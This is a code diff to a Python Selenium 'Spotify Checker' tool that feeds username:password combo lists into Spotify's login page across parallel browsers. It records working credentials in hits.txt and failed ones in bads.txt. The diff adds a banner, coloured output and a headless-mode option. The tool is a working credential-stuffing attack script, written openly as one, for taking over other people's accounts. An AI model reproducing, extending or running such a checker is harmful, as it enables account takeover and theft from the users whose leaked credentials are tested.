@@ -25,13 +25,19 @@ class Main:
     def __init__(self):
         self.clear()
         self.SetTitle('One Man Builds Spotify Checker Selenium Tool (Proxyless)')
-        self.BOLD = '\033[1m'
-        init()
-        self.browser_amount = int(input('[QUESTION] How many browser would you like to run at the same time: '))
+        init(convert=True)
+        title = Fore.YELLOW+"""
+                            
+                    ____ ___  ____ ___ _ ____ _   _    ____ _  _ ____ ____ _  _ ____ ____ 
+                    [__  |__] |  |  |  | |___  \_/     |    |__| |___ |    |_/  |___ |__/ 
+                    ___] |    |__|  |  | |      |      |___ |  | |___ |___ | \_ |___ |  \ 
+                                                                                        
+                            
+        """
+        print(title)
+        self.browser_amount = int(input(Fore.YELLOW+'['+Fore.WHITE+'>'+Fore.YELLOW+'] How many browser would you like to run at the same time: '))
+        self.headless = int(input(Fore.YELLOW+'['+Fore.WHITE+'>'+Fore.YELLOW+'] Would you like to use Headless mode [1]yes [0]no: '))
         print('')
-
-    def PrintText(self,info_name,text,info_color:Fore,text_color:Fore):
-        print(self.BOLD+'{0}[{1}{2}{3}] '.format(info_color,Fore.RESET,info_name,info_color)+text_color+f'{text}\r')
 
     def ReadFile(self,filename,method):
         with open(filename,method) as f:
@@ -41,7 +47,10 @@ class Main:
     def Login(self,combos):
         try:
             options = Options()
-            options.add_argument('--headless')
+            
+            if self.headless == 1:
+                options.add_argument('--headless')
+
             options.add_argument('no-sandbox')
             options.add_argument('--log-level=3')
             options.add_experimental_option('excludeSwitches', ['enable-logging','enable-automation'])
@@ -58,11 +67,11 @@ class Main:
             sleep(1.25)
 
             if driver.current_url == 'https://accounts.spotify.com/en/status':
-                self.PrintText('HIT','{0}:{1}'.format(username,password),Fore.GREEN,Fore.GREEN)
+                print(Fore.GREEN+'['+Fore.WHITE+'!'+Fore.GREEN+'] HIT | {0}:{1}'.format(username,password))
                 with open('hits.txt','a') as f:
                     f.write('{0}:{1}\n'.format(username,password))
             else:
-                self.PrintText('BAD','{0}:{1}'.format(username,password),Fore.RED,Fore.RED)
+                print(Fore.RED+'['+Fore.WHITE+'-'+Fore.RED+'] BAD | {0}:{1}'.format(username,password))
                 with open('bads.txt','a') as f:
                     f.write('{0}:{1}\n'.format(username,password))
 
